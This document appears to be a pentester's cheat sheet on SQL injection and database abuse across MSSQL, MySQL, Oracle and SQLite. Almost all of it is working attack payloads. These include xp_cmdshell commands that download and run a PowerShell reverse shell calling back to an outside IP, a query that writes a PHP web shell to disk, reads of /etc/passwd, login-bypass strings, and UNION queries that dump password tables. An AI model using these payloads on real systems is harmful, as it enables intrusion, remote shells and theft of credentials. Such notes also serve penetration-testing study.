### Abuse MSSQL

-> edit Invoke-PowerShellTcp.ps1, adding this:  
```
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
```
```
impacket-mssqlclient <user>@<ip> -db <database>
```
```
xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://<ip>/Invoke-PowerShellTcp.ps1\")
```
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

### Webshell via SQLI - MySQL
```
LOAD_FILE('/etc/httpd/conf/httpd.conf')    
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
```
 
### Reading Files via SQLI - MySQL
e.g  
```
SELECT LOAD_FILE('/etc/passwd')
```

#### MSSQL Injection

-> Bypass Authentication
```
' or 1=1--
```

-> Enable xp_cmdshell
```
' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

-> RCE
```
' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<ip>/InvokePowerShellTcp.ps1')" ;--
```
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1


### Oracle SQL

-> Bypass Authentication
```
' or 1=1--
```

-> Exploiting
```
' order by 3--
' union select null,table_name,null from all_tables--
' union select null,column_name,null from all_tab_columns where table_name='WEB_USERS'--
' union select null,column_name,null from all_tab_columns where table_name='WEB_ADMINS'--
' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
' union select null,PASSWORD,null from WEB_ADMINS--
```

### SQLite Injection
-> extracting table names, not displaying standard sqlite tables
```
http://site.com/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
```
-> extracting table users  
```
http://site.com/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users--
```

-> Reference  
https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf
